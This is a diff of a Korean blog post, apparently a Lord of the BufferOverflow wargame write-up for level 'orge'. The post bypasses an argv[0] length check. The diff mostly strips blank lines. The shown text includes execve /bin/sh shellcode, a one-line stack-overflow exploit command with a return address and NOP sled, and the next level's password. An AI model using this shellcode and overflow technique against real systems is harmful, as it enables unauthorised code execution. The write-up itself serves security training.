@@ -10,11 +10,7 @@ article_header:
     src: 
 ---
 
-## keyword : check argv[0]
-
 [+ Check argv[0]](#){:.button.button--outline-success.button--pill}
-
-
 
 ```c
 /*
@@ -72,11 +68,7 @@ main(int argc, char *argv[])
 
 ------
 
-
-
 ### 0x01. Analysis
-
-
 
 ```c
 // here is changed!
@@ -102,13 +94,9 @@ shell에는 다음과 같은 기능(?)이 있다.
 
 나머지 문제 풀이법은 darkelf와 같다.
 
-
-
 ------
 
 ### 0x02. Exploit
-
-
 
 core 덤프를 떨궈 쉘코가 들어갈 주소를 구하자.
 
@@ -136,18 +124,11 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 /home/darkelf////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x64\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
 ```
 
-
-
-------
-
-
+-----
 
 ### 0x03. 정리
 
-
-
 argv[0]의 길이를 체크하는 메커니즘이 들어 갔으며, 쉘기능을 사용하여 argv[0] 길이 체크 메커니즘을 우회하였다.
 
+-----
 
-
-**orge / timewalker**
